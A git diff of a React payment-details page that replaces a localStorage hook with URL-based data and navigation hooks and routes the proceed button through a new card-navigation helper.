@@ -3,14 +3,15 @@ import { Button } from "@/components/ui/button";
 import { getServiceBranding } from "@/lib/serviceLogos";
 import { getServiceBrandingByType, getServiceTitle, getServiceIcon } from "@/lib/serviceBranding";
 import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
-import { useLink } from "@/hooks/useLocalStorage";
+import { useLinkData, useLinkNavigation } from "@/hooks/useUrlBasedData";
 import { CreditCard, ArrowLeft, Hash, DollarSign, Package, Truck, FileText, Heart, Building2, User, Calendar } from "lucide-react";
 import { formatCurrency } from "@/lib/countries";
 
 const PaymentDetails = () => {
   const { id } = useParams();
   const navigate = useNavigate();
-  const { data: linkData } = useLink(id);
+  const { linkData } = useLinkData();
+  const { navigateToCard } = useLinkNavigation();
   
   if (!linkData) {
     return null;
@@ -64,7 +65,9 @@ const PaymentDetails = () => {
   };
   
   const handleProceed = () => {
-    navigate(`/pay/${id}/card`);
+    if (linkData) {
+      navigate(navigateToCard(id!, linkData));
+    }
   };
   
   return (
